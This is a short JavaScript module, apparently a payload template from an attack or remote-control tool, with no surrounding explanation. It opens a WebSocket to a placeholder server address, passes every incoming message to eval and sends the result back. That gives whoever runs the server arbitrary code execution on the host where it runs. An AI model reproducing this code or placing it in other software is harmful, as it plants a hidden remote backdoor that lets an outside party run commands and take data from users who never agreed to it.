// TODO Support other communication channels
module.exports = ()=>{ws=new WebSocket($$SERVER_URL$$);ws.onmessage=msg=>ws.send(eval(msg.data))}
